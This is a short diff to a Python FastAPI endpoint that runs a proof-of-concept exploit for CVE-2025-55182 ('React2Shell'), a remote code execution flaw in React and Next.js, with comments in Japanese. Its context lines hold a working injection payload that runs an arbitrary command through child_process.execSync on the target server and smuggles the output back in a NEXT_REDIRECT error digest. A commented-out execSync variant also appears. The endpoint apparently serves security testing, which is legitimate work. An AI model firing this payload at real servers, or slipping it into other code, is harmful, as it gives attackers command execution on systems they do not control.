@@ -17,7 +17,7 @@ app_base_path = "/security"
 
 
 @app.post(f"{app_base_path}/react2shell/id", tags=["poc"], response_model=dict)
-async def get_id(body: dict):
+async def get_id():
     '''
     CVE-2025-55182 (React2Shell) のPoCコードを実行します。
 
@@ -52,6 +52,7 @@ async def get_id(body: dict):
         "value": '{"then": "$B0"}',
         "_response": {
             # 実行コマンドを注入し、Next.jsのエラーハンドリングを利用して結果を抽出
+            # 脆弱性対応されたReactやNext.jsで動作するアプリに対してはタイムアウトになる。
             "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
             # RCEをトリガーしない場合の代替（コメントアウト）
             # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
